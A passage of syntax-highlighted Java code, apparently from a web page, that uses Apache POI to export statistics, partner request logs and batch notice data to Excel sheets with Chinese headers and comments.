punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            SimpleDateFormat simpleDateFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                TStatisticsEnt tStatisticsEnt <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getSupCodeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getSubCodeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getStartTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>simpleDateFormat<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getStartTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getEndTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>simpleDateFormat<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getEndTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>tStatisticsEnt<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportPartnersForNSH</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>PartnersRequestLog<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"客户名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"查询日期"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"查询内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"返回内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口状态"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            HSSFCellStyle styleBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFFont fontBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            fontBt<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            fontBt<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>fontBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>SEA_GREEN<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//背景</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                sheet<span class="token punctuation">.</span><span class="token function">autoSizeColumn</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                if(i==1){</span><span class="token comment" spellcheck="true">//                    sheet.setColumnWidth(i, 10000);</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//                if(i==2||i==3){</span><span class="token comment" spellcheck="true">//                    sheet.setColumnWidth(i, 5000);</span><span class="token comment" spellcheck="true">//                }</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>styleBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            SimpleDateFormat simpleDateFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                PartnersRequestLog partnersRequestLog <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>partnersRequestLog<span class="token punctuation">.</span><span class="token function">getPartner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>partnersRequestLog<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            String request <span class="token operator">=</span> partnersRequestLog<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">try</span> <span class="token punctuation">{</span>                                    JSONObject jsonObject <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"entName"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>partnersRequestLog<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>partnersRequestLog<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            String status <span class="token operator">=</span> partnersRequestLog<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">excelBatchNoticeFileData</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>BatchNoticeFileData<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"序号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"统一社会信用代码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"数据主键"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"批量数据供给管理"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            HSSFCellStyle styleBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFFont fontBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            fontBt<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            fontBt<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>fontBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>SEA_GREEN<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//背景</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            styleBt .setAlignment(HorizontalAlignment.CENTER);</span><span class="token comment" spellcheck="true">//            styleBt .setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00%"));</span><span class="token comment" spellcheck="true">//            styleBt.setFillBackgroundColor((short) 59);</span><span class="token comment" spellcheck="true">//            styleBt.setFillForegroundColor((short) 59);</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span><span class="token comment" spellcheck="true">//                sheet.setColumnWidth(i, 5000);</span>                sheet<span class="token punctuation">.</span><span class="token function">autoSizeColumn</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">15000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>styleBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            SimpleDateFormat simpleDateFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> 